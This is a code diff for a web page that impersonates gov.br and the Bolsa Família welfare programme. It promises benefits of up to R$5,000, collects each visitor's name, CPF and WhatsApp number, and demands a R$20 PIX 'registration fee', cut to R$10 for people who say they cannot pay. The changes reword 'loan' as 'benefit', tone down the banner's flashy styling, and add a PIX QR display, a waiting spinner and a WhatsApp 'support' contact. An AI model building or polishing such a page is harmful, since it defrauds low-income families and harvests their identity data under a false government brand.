@@ -23,67 +23,65 @@
 
         body { background-color: var(--branco); color: var(--cinza-texto); padding-bottom: 80px; }
 
+        /* FAIXA TOPO (ANÚNCIO SUAVE) */
         .faixa-destaque-topo {
             background-color: var(--azul-escuro);
             color: var(--branco);
             text-align: center;
-            padding: 15px 15px 20px 15px;
+            padding: 15px 15px;
             position: sticky;
             top: 0;
             z-index: 200;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.5);
+            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 10px;
-            border-bottom: 6px solid var(--amarelo-bolsa);
+            gap: 8px;
+            border-bottom: 3px solid var(--amarelo-bolsa);
         }
 
         .faixa-destaque-topo h2 {
-            font-size: 22px;
-            font-weight: 900;
-            color: var(--amarelo-bolsa);
-            text-transform: uppercase;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
-            animation: pulsarTexto 1.5s infinite;
-            line-height: 1.2;
+            font-size: 18px;
+            font-weight: 500;
+            color: var(--branco);
+            text-transform: none;
+            line-height: 1.3;
         }
 
         .destaque-valor {
             background-color: var(--amarelo-bolsa);
-            color: var(--vermelho-bolsa);
-            padding: 2px 10px;
-            border-radius: 5px;
-            font-size: 26px;
+            color: var(--azul-escuro);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 20px;
             display: inline-block;
-            margin: 0 5px;
-            box-shadow: 0 0 15px rgba(255, 205, 7, 0.8);
-            transform: rotate(-2deg);
+            margin: 0 3px;
+            font-weight: 700;
         }
 
-        .faixa-destaque-topo p { font-size: 15px; font-weight: 700; background: rgba(255,255,255,0.1); padding: 5px 15px; border-radius: 20px; }
+        .faixa-destaque-topo p { 
+            font-size: 14px; 
+            font-weight: 400; 
+            color: #ddd; 
+        }
 
         .btn-destaque {
             background-color: var(--verde-bolsa);
             color: white;
-            border: 3px solid var(--amarelo-bolsa);
-            padding: 15px 40px;
-            border-radius: 30px;
-            font-weight: 900;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 6px;
+            font-weight: 600;
             cursor: pointer;
-            font-size: 18px;
-            transition: 0.2s;
-            box-shadow: 0 0 20px rgba(22, 136, 33, 0.8);
-            text-transform: uppercase;
-            animation: pulsarBotao 1.5s infinite;
+            font-size: 15px;
+            transition: background 0.2s;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
             margin-top: 5px;
         }
-        .btn-destaque:hover { background-color: #116b1b; transform: scale(1.1); }
+        .btn-destaque:hover { background-color: #116b1b; }
 
-        @keyframes pulsarTexto { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-        @keyframes pulsarBotao { 0% { transform: scale(1); box-shadow: 0 0 10px rgba(22, 136, 33, 0.6); } 50% { transform: scale(1.03); box-shadow: 0 0 25px rgba(22, 136, 33, 1); } 100% { transform: scale(1); box-shadow: 0 0 10px rgba(22, 136, 33, 0.6); } }
-
-        header { border-bottom: 1px solid #ddd; padding: 10px 20px; position: sticky; top: 140px; background: var(--branco); z-index: 100; }
+        /* RESTO DO SITE MANTIDO IGUAL */
+        header { border-bottom: 1px solid #ddd; padding: 10px 20px; position: sticky; top: 110px; background: var(--branco); z-index: 100; }
         .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
         .logo-gov { font-size: 28px; font-weight: 900; color: var(--azul-gov); letter-spacing: -1px; }
         .logo-gov span { color: var(--amarelo-bolsa); }
@@ -179,8 +177,20 @@
         .step-payment .valor-taxa { font-size: 40px; font-weight: 900; color: var(--verde-bolsa); margin: 15px 0; }
         .step-payment p { font-size: 14px; color: #333; margin-bottom: 20px; line-height: 1.5; }
         .step-payment .destaque-taxa { font-weight: bold; color: var(--vermelho-bolsa); }
+        
+        .pix-container { background: #fff; border: 1px solid #ddd; border-radius: 10px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        .pix-qr-code { width: 200px; height: 200px; margin: 0 auto 15px auto; display: block; }
+        .pix-code { background:#f0f0f0; padding:10px; border-radius:8px; word-break: break-all; font-size:12px; text-align: left; margin-bottom: 15px; border: 1px dashed #ccc; }
+        
         .btn-pagamento { background-color: var(--azul-gov); color: white; border: 2px solid var(--amarelo-bolsa); padding: 15px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: 900; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
         .btn-pagamento:disabled { opacity: 0.7; cursor: wait; }
+        
+        .waiting-box { display: none; padding: 20px; background: #e8f0fe; border-radius: 8px; margin-top: 15px; text-align: center; }
+        .spinner-small { border: 3px solid #f3f3f3; border-top: 3px solid var(--azul-gov); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .btn-support { background: var(--azul-gov); color: white; border: none; width: 100%; padding: 15px; border-radius: 8px; font-size: 1rem; font-weight: bold; cursor: pointer; margin-top: 10px; display: flex; justify-content: center; align-items: center; gap: 8px; text-decoration: none;}
+        .btn-retry { background: var(--amarelo-bolsa); color: var(--azul-escuro); border: none; width: 100%; padding: 15px; border-radius: 8px; font-size: 1rem; font-weight: bold; cursor: pointer; margin-top: 10px; }
 
         .link-downsell { display: block; margin-top: 20px; color: #666; font-size: 14px; text-decoration: underline; cursor: pointer; background: none; border: none; width: 100%; padding: 10px; }
         .link-downsell:hover { color: var(--vermelho-bolsa); }
@@ -210,26 +220,26 @@
             .hero h1 { font-size: 32px; }
             .nav-cards { flex-direction: row; flex-wrap: wrap; justify-content: center;}
             .nav-card-btn { width: calc(50% - 10px); flex-direction: column; gap: 15px; text-align: center; padding: 25px 15px;}
-            header { top: 120px; }
-            .faixa-destaque-topo h2 { font-size: 26px; }
-            .destaque-valor { font-size: 32px; }
+            header { top: 110px; }
         }
     </style>
 </head>
 <body>
 
+    <!-- FAIXA TOPO ATUALIZADA -->
     <div class="faixa-destaque-topo">
-        <h2>Bolsa Família com direito a empréstimo de <span class="destaque-valor">até 5 mil</span></h2>
-        <p>Complete seu cadastro e veja se tem direito!</p>
+        <h2>Bolsa Família com direito a benefício de <span class="destaque-valor">até 5 mil</span></h2>
+        <p>Complete seu cadastro e veja se tem direito.</p>
         <button class="btn-destaque" onclick="abrirCadastro()">Verificar Benefício Agora</button>
     </div>
 
+    <!-- HEADER -->
     <header>
         <div class="top-bar">
             <div class="logo-gov">gov<span>.</span>br</div>
             <div class="top-actions">
                 <a href="#" class="btn-outline">⣿ Atalhos gov.br</a>
-                <button class="btn-solid">👤 Entrar</button>
+                <button class="btn-solid" onclick="abrirCadastro()">👤 Entrar</button>
             </div>
         </div>
         <div class="menu-principal">
@@ -240,21 +250,24 @@
 
     <div class="breadcrumb">🏠 > Ações e Programas > <span>Bolsa Família</span></div>
 
+    <!-- HERO ATUALIZADO -->
     <section class="hero">
-        <div class="tarja-oferta-hero">💰 Empréstimo de <span>até R$ 5.000,00</span> disponível para saque!</div>
+        <div class="tarja-oferta-hero">💰 Benefício de <span>até R$ 5.000,00</span> disponível!</div>
         <div class="hero-logo">PROGRAMA <br><span>BOLSA</span> família</div>
         <h1>Comida na mesa, vacina no braço e um futuro com novas oportunidades.</h1>
     </section>
 
+    <!-- MENU CARDS ATUALIZADO -->
     <section class="nav-cards">
-        <div class="nav-card-btn"><span>Conheça as Regras</span><button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Empréstimo</button></div>
-        <div class="nav-card-btn"><span>Verdade ou Mentira</span><button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Empréstimo</button></div>
-        <div class="nav-card-btn"><span>Pagamentos e Benefícios</span><button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Empréstimo</button></div>
-        <div class="nav-card-btn"><span>Regra de Proteção</span><button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Empréstimo</button></div>
-        <div class="nav-card-btn"><span>Bolsa em Números</span><button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Empréstimo</button></div>
-        <div class="nav-card-btn"><span>Primeira Infância</span><button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Empréstimo</button></div>
+        <div class="nav-card-btn"><span>Conheça as Regras</span><button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Benefício</button></div>
+        <div class="nav-card-btn"><span>Verdade ou Mentira</span><button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Benefício</button></div>
+        <div class="nav-card-btn"><span>Pagamentos e Benefícios</span><button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Benefício</button></div>
+        <div class="nav-card-btn"><span>Regra de Proteção</span><button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Benefício</button></div>
+        <div class="nav-card-btn"><span>Bolsa em Números</span><button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Benefício</button></div>
+        <div class="nav-card-btn"><span>Primeira Infância</span><button class="btn-beneficio-card" onclick="abrirCadastro()">Verificar Benefício</button></div>
     </section>
 
+    <!-- RESTO DO SITE -->
     <section class="info-text">
         <h2>O Bolsa Família, junto com ações de saúde, educação e assistência social, contribui para a garantia de direitos e a melhoria de vida das famílias beneficiárias.</h2>
         <p>Ao longo desses de 23 anos, muitas histórias foram construídas e transformadas: famílias que conseguiram colocar comida na mesa, manter as vacinas em dia, ver os filhos crescerem, estudarem e conquistarem novas oportunidades. É por você, que faz parte do Bolsa Família, que o Governo Federal segue trabalhando todos os dias, para levar mais segurança, dignidade e melhores condições para a sua família.</p>
@@ -306,6 +319,7 @@
 
     <div class="btn-acessibilidade">♿</div>
 
+    <!-- MODAL DO FUNIL ATUALIZADO -->
     <div class="modal-overlay" id="modalCadastro">
         <div class="modal-content">
             <button class="close-btn" onclick="fecharCadastro()">×</button>
@@ -358,22 +372,41 @@
 
             <div class="step-form" id="stepFormulario">
                 <h2>Quase lá! Preencha seus dados</h2>
-                <p>Com base nas suas respostas, você pode ter direito ao empréstimo.</p>
+                <p>Com base nas suas respostas, você pode ter direito ao benefício.</p>
                 <form id="formLead" onsubmit="enviarDados(event)">
                     <div class="input-group"><label>Nome Completo</label><input type="text" id="nome" placeholder="Digite seu nome" required></div>
                     <div class="input-group"><label>CPF</label><input type="text" id="cpf" placeholder="000.000.000-00" required></div>
                     <div class="input-group"><label>WhatsApp</label><input type="tel" id="whatsapp" placeholder="(00) 00000-0000" required></div>
-                    <button type="submit" class="btn-submit-form" id="btnEnviar">Consultar Empréstimo</button>
+                    <button type="submit" class="btn-submit-form" id="btnEnviar">Consultar Benefício</button>
                 </form>
             </div>
 
             <div class="step-payment" id="passoPagamento">
-                <h2>Empréstimo Pré-Aprovado!</h2>
-                <p>Parabéns! Seu perfil foi localizado e você tem direito ao empréstimo de <strong>até R$ 5.000,00</strong>.</p>
+                <h2>Benefício Pré-Aprovado!</h2>
+                <p>Parabéns! Seu perfil foi localizado e você tem direito ao benefício de <strong>até R$ 5.000,00</strong>.</p>
                 <div class="valor-taxa">R$ 20,00</div>
                 <p>Para liberar o valor total e agendar o saque, é necessário o pagamento da <span class="destaque-taxa">taxa de inscrição única</span> no valor de R$ 20,00.</p>
-                <button class="btn-pagamento" id="btnPagar" onclick="processarPagamento()">Pagar R$ 20,00 e Liberar Empréstimo</button>
-                <button class="link-downsell" onclick="abrirDownsell()">Não tenho R$ 20,00, mas preciso do benefício.</button>
+                
+                <button class="btn-pagamento" id="btnPagar" onclick="processarPagamento()">Pagar R$ 20,00 e Liberar Benefício</button>
+                
+                <div id="pix-area-1" style="display: none;">
+                    <div class="pix-container">
+                        <img id="qr-code-img-1" class="pix-qr-code" src="" alt="QR Code PIX">
+                        <div id="pix-code-text-1" class="pix-code"></div>
+                        <button onclick="copiarPix(1)" style="background:var(--verde-bolsa); color:white; padding:10px; width:100%; border:none; border-radius:8px; font-weight:bold; cursor:pointer;">📋 Copiar Código PIX</button>
+                    </div>
+                    
+                    <div id="waiting-1" class="waiting-box">
+                        <div class="spinner-small"></div>
+                        <p style="font-weight: bold; color: var(--azul-gov);">Aguardando confirmação...</p>
+                        <div id="options-1" style="display: none; margin-top: 15px;">
+                            <button class="btn-retry" onclick="resetPayment(1)">Ainda não paguei (Tentar Novamente)</button>
+                            <a href="https://wa.me/5548991763622?text=Ola,%20gereei%20o%20pix%20de%20R$20%20mas%20preciso%20de%20ajuda" target="_blank" class="btn-support">💬 Dificuldades? Falar com Suporte</a>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="link-downsell" id="btn-downsell-1" onclick="abrirDownsell()">Não tenho R$ 20,00, mas preciso do benefício.</button>
             </div>
 
             <div class="step-funnel" id="funnelDown1">
@@ -400,8 +433,26 @@
                 <p>Como você demonstrou real necessidade, liberamos uma <strong>taxa social reduzida</strong> para o seu caso.</p>
                 <div class="valor-taxa" style="font-size: 20px; text-decoration: line-through; color: #999; margin-bottom: 0;">R$ 20,00</div>
                 <div class="valor-taxa">R$ 10,00</div>
-                <p>Aproveite esta condição única. Pague apenas <span class="destaque-taxa">R$ 10,00</span> para liberar o valor total do seu empréstimo.</p>
-                <button class="btn-downsell" onclick="processarPagamentoDownsell()">Pagar R$ 10,00 e Liberar Empréstimo</button>
+                <p>Aproveite esta condição única. Pague apenas <span class="destaque-taxa">R$ 10,00</span> para liberar o valor total do seu benefício.</p>
+                
+                <button class="btn-downsell" id="btnPagarDown" onclick="processarPagamentoDownsell()">Pagar R$ 10,00 e Liberar Benefício</button>
+                
+                <div id="pix-area-2" style="display: none;">
+                    <div class="pix-container">
+                        <img id="qr-code-img-2" class="pix-qr-code" src="" alt="QR Code PIX">
+                        <div id="pix-code-text-2" class="pix-code"></div>
+                        <button onclick="copiarPix(2)" style="background:var(--verde-bolsa); color:white; padding:10px; width:100%; border:none; border-radius:8px; font-weight:bold; cursor:pointer;">📋 Copiar Código PIX</button>
+                    </div>
+                    
+                    <div id="waiting-2" class="waiting-box">
+                        <div class="spinner-small"></div>
+                        <p style="font-weight: bold; color: var(--azul-gov);">Aguardando confirmação...</p>
+                        <div id="options-2" style="display: none; margin-top: 15px;">
+                            <button class="btn-retry" onclick="resetPayment(2)">Ainda não paguei (Tentar Novamente)</button>
+                            <a href="https://wa.me/5548991763622?text=Ola,%20gereei%20o%20pix%20de%20R$10%20mas%20preciso%20de%20ajuda" target="_blank" class="btn-support">💬 Dificuldades? Falar com Suporte</a>
+                        </div>
+                    </div>
+                </div>
                 <p style="font-size: 11px; margin-top: 15px; color: #999;">Oferta válida apenas nesta tela.</p>
             </div>
 
@@ -409,15 +460,16 @@
                 <div class="icon-check">✓</div>
                 <h2>Pagamento Confirmado!</h2>
                 <p>Seu cadastro foi recebido com sucesso e agora está em <strong>processo de verificação</strong>.</p>
-                <div class="aviso-tempo">⏳ Atenção: Devido à alta demanda, a análise e liberação do empréstimo pode levar <strong>até 3 meses</strong>.</div>
+                <div class="aviso-tempo">⏳ Atenção: Devido à alta demanda, a análise e liberação do benefício pode levar <strong>até 3 meses</strong>.</div>
                 <div class="caixa-contato">
                     <h3>Ficou com alguma dúvida?</h3>
                     <p>Fale com um de nossos colaboradores pelo WhatsApp:</p>
                     <span class="numero-telefone">(48) 99176-3622</span>
-                    <a href="https://wa.me/5548991763622?text=Ol%C3%A1!%20Fiz%20o%20pagamento%20do%20empr%C3%A9stimo%20e%20gostaria%20de%20tirar%20uma%20d%C3%BAvida." target="_blank" class="btn-whatsapp">💬 Falar no WhatsApp</a>
+                    <a href="https://wa.me/5548991763622?text=Ol%C3%A1!%20Fiz%20o%20pagamento%20do%20benef%C3%ADcio%20e%20gostaria%20de%20tirar%20uma%20d%C3%BAvida." target="_blank" class="btn-whatsapp">💬 Falar no WhatsApp</a>
                 </div>
                 <p class="obs">Você pode fechar esta janela. Guarde o número de telefone para futuras consultas.</p>
             </div>
+
         </div>
     </div>
 
@@ -431,12 +483,15 @@
         const passoVerificacao = document.getElementById('passoVerificacao');
         const btnEnviar = document.getElementById('btnEnviar');
         const btnPagar = document.getElementById('btnPagar');
+        const btnPagarDown = document.getElementById('btnPagarDown');
         
         let respostasFunil = { renda: "", pessoas: "", trabalho: "", filhos: "", moradia: "", cadunico: "" };
         const funisPrincipais = [document.getElementById('funnel1'), document.getElementById('funnel2'), document.getElementById('funnel3'), document.getElementById('funnel4'), document.getElementById('funnel5'), document.getElementById('funnel6')];
         const funisDownsell = [document.getElementById('funnelDown1'), document.getElementById('funnelDown2'), document.getElementById('funnelDown3')];
         let funilAbertoManualmente = false;
         let funilJaAbriuAutomatico = false;
+        
+        let timerAutoOpen1, timerAutoOpen2;
 
         window.onload = function() {
             setTimeout(function() {
@@ -460,11 +515,31 @@
             progressContainer.style.display = 'block';
             respostasFunil = { renda: "", pessoas: "", trabalho: "", filhos: "", moradia: "", cadunico: "" };
             document.getElementById('formLead').reset();
-            btnPagar.innerHTML = "Pagar R$ 20,00 e Liberar Empréstimo";
+            
+            btnPagar.innerHTML = "Pagar R$ 20,00 e Liberar Benefício";
             btnPagar.disabled = false;
+            btnPagar.style.display = 'block';
+            document.getElementById('pix-area-1').style.display = 'none';
+            document.getElementById('waiting-1').style.display = 'none';
+            document.getElementById('options-1').style.display = 'none';
+            
+            btnPagarDown.innerHTML = "Pagar R$ 10,00 e Liberar Benefício";
+            btnPagarDown.disabled = false;
+            btnPagarDown.style.display = 'block';
+            document.getElementById('pix-area-2').style.display = 'none';
+            document.getElementById('waiting-2').style.display = 'none';
+            document.getElementById('options-2').style.display = 'none';
+            
+            clearTimeout(timerAutoOpen1);
+            clearTimeout(timerAutoOpen2);
         }
 
-        function fecharCadastro() { modal.style.display = 'none'; }
+        function fecharCadastro() { 
+            modal.style.display = 'none'; 
+            clearTimeout(timerAutoOpen1);
+            clearTimeout(timerAutoOpen2);
+        }
+        
         window.onclick = function(event) { if (event.target == modal) { fecharCadastro(); } }
 
         function responderFunil(resposta, etapa) {
@@ -474,10 +549,16 @@
             if (etapa === 4) respostasFunil.filhos = resposta;
             if (etapa === 5) respostasFunil.moradia = resposta;
             if (etapa === 6) respostasFunil.cadunico = resposta;
+            
             const porcentagem = (etapa / 6) * 100;
             progressBar.style.width = porcentagem + '%';
+            
             funisPrincipais[etapa - 1].classList.remove('active');
-            if (etapa < 6) { funisPrincipais[etapa].classList.add('active'); } else { stepFormulario.style.display = 'block'; }
+            if (etapa < 6) { 
+                funisPrincipais[etapa].classList.add('active'); 
+            } else { 
+                stepFormulario.style.display = 'block'; 
+            }
         }
 
         async function enviarDados(event) {
@@ -506,7 +587,6 @@
             }
         }
 
-        // FUNÇÃO PARA GERAR O PIX E MOSTRAR O QR CODE (R$ 20)
         async function processarPagamento() {
             const textoOriginal = btnPagar.innerHTML;
             btnPagar.innerHTML = "Gerando PIX...";
@@ -516,38 +596,26 @@
                 const resposta = await fetch('/api/pagamento', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        valor: 20, 
-                        cliente: document.getElementById('nome').value 
-                    })
+                    body: JSON.stringify({ valor: 20, cliente: document.getElementById('nome').value })
                 });
 
                 const resultado = await resposta.json();
 
                 if (resposta.ok && resultado.sucesso) {
-                    // Usa a API do Google Charts para gerar a imagem do QR Code a partir do código PIX
                     const qrCodeUrl = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${encodeURIComponent(resultado.qr_code)}&choe=UTF-8`;
-
-                    passoPagamento.innerHTML = `
-                        <h2>Pague com PIX para Liberar</h2>
-                        <p>Escaneie o QR Code abaixo com o app do seu banco ou copie o código.</p>
-                        
-                        <div style="text-align: center; margin: 15px 0;">
-                            <img src="${qrCodeUrl}" alt="QR Code PIX" style="width: 200px; height: 200px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);">
-                        </div>
-
-                        <div style="background:#f0f0f0; padding:10px; border-radius:8px; word-break: break-all; font-size:12px; margin:20px 0; text-align: left;">
-                            ${resultado.qr_code}
-                        </div>
-                        
-                        <button onclick="navigator.clipboard.writeText('${resultado.qr_code}'); alert('Código copiado!')" style="background:var(--verde-bolsa); color:white; padding:15px; width:100%; border:none; border-radius:10px; font-weight:bold; cursor:pointer; margin-bottom:10px; box-shadow: 0 4px 10px rgba(22,136,33,0.3);">
-                            📋 Copiar Código PIX
-                        </button>
-                        
-                        <p style="font-size:12px; color:#666;">Após o pagamento, a confirmação é automática.</p>
-                        
-                        <button onclick="verificarPagamento('${resultado.id_transacao}')" style="background:transparent; border:none; color:var(--azul-gov); text-decoration:underline; cursor:pointer; margin-top: 10px;">Já Paguei (Verificar)</button>
-                    `;
+                    
+                    document.getElementById('qr-code-img-1').src = qrCodeUrl;
+                    document.getElementById('pix-code-text-1').innerText = resultado.qr_code;
+                    
+                    btnPagar.style.display = 'none';
+                    document.getElementById('pix-area-1').style.display = 'block';
+                    document.getElementById('waiting-1').style.display = 'block';
+                    
+                    timerAutoOpen1 = setTimeout(function() {
+                        if (document.getElementById('options-1').style.display === 'none') {
+                            document.getElementById('options-1').style.display = 'block';
+                        }
+                    }, 5000);
 
                 } else {
                     alert("Erro ao gerar PIX: " + (resultado.error || "Tente novamente."));
@@ -561,79 +629,64 @@
             }
         }
 
-        // FUNÇÃO PARA GERAR O PIX DO DOWNSELL (R$ 10)
         async function processarPagamentoDownsell() {
-            const btnDownsell = document.querySelector('.btn-downsell');
-            const textoOriginal = btnDownsell.innerHTML;
-            btnDownsell.innerHTML = "Gerando PIX...";
-            btnDownsell.disabled = true;
+            const textoOriginal = btnPagarDown.innerHTML;
+            btnPagarDown.innerHTML = "Gerando PIX...";
+            btnPagarDown.disabled = true;
 
             try {
                 const resposta = await fetch('/api/pagamento', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        valor: 10, 
-                        cliente: document.getElementById('nome').value 
-                    })
+                    body: JSON.stringify({ valor: 10, cliente: document.getElementById('nome').value })
                 });
 
                 const resultado = await resposta.json();
 
                 if (resposta.ok && resultado.sucesso) {
                     const qrCodeUrl = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${encodeURIComponent(resultado.qr_code)}&choe=UTF-8`;
-
-                    passoDownsell.innerHTML = `
-                        <h2>Pague com PIX para Liberar</h2>
-                        <p>Escaneie o QR Code abaixo com o app do seu banco ou copie o código.</p>
-                        
-                        <div style="text-align: center; margin: 15px 0;">
-                            <img src="${qrCodeUrl}" alt="QR Code PIX" style="width: 200px; height: 200px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);">
-                        </div>
-
-                        <div style="background:#f0f0f0; padding:10px; border-radius:8px; word-break: break-all; font-size:12px; margin:20px 0; text-align: left;">
-                            ${resultado.qr_code}
-                        </div>
-                        
-                        <button onclick="navigator.clipboard.writeText('${resultado.qr_code}'); alert('Código copiado!')" style="background:var(--verde-bolsa); color:white; padding:15px; width:100%; border:none; border-radius:10px; font-weight:bold; cursor:pointer; margin-bottom:10px; box-shadow: 0 4px 10px rgba(22,136,33,0.3);">
-                            📋 Copiar Código PIX
-                        </button>
-                        
-                        <p style="font-size:12px; color:#666;">Após o pagamento, a confirmação é automática.</p>
-                        
-                        <button onclick="verificarPagamento('${resultado.id_transacao}')" style="background:transparent; border:none; color:var(--azul-gov); text-decoration:underline; cursor:pointer; margin-top: 10px;">Já Paguei (Verificar)</button>
-                    `;
+                    
+                    document.getElementById('qr-code-img-2').src = qrCodeUrl;
+                    document.getElementById('pix-code-text-2').innerText = resultado.qr_code;
+                    
+                    btnPagarDown.style.display = 'none';
+                    document.getElementById('pix-area-2').style.display = 'block';
+                    document.getElementById('waiting-2').style.display = 'block';
+                    
+                    timerAutoOpen2 = setTimeout(function() {
+                        if (document.getElementById('options-2').style.display === 'none') {
+                            document.getElementById('options-2').style.display = 'block';
+                        }
+                    }, 5000);
 
                 } else {
                     alert("Erro ao gerar PIX: " + (resultado.error || "Tente novamente."));
-                    btnDownsell.innerHTML = textoOriginal;
-                    btnDownsell.disabled = false;
+                    btnPagarDown.innerHTML = textoOriginal;
+                    btnPagarDown.disabled = false;
                 }
             } catch (error) {
                 alert("Erro de conexão com o servidor.");
-                btnDownsell.innerHTML = textoOriginal;
-                btnDownsell.disabled = false;
+                btnPagarDown.innerHTML = textoOriginal;
+                btnPagarDown.disabled = false;
             }
         }
 
-        async function verificarPagamento(idTransacao) {
-            try {
-                const resposta = await fetch('/api/verificar-pagamento', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ id_transacao: idTransacao })
-                });
+        function copiarPix(tipo) {
+            const codigo = tipo === 1 ? document.getElementById('pix-code-text-1').innerText : document.getElementById('pix-code-text-2').innerText;
+            navigator.clipboard.writeText(codigo).then(() => {
+                alert('Código PIX copiado com sucesso!');
+            }).catch(err => {
+                alert('Erro ao copiar. Selecione o texto manualmente.');
+            });
+        }
 
-                const resultado = await resposta.json();
-
-                if (resposta.ok && resultado.pago) {
-                    passoPagamento.style.display = 'none';
-                    passoVerificacao.style.display = 'block';
-                } else {
-                    alert("Pagamento ainda não identificado. Aguarde alguns instantes e tente novamente.");
-                }
-            } catch (error) {
-                alert("Erro ao verificar pagamento. Tente novamente.");
+        function resetPayment(tipo) {
+            if (tipo === 1) {
+                document.getElementById('waiting-1').style.display = 'block';
+                document.getElementById('options-1').style.display = 'none';
+            } else {
+                document.getElementById('waiting-2').style.display = 'block';
+                document.getElementById('options-2').style.display = 'none';
             }
         }
 
@@ -642,6 +695,7 @@
             funisDownsell[0].classList.add('active');
             progressContainer.style.display = 'block'; 
             progressBar.style.width = '33%';
+            clearTimeout(timerAutoOpen1);
         }
 
         function responderDownsell(etapa) {
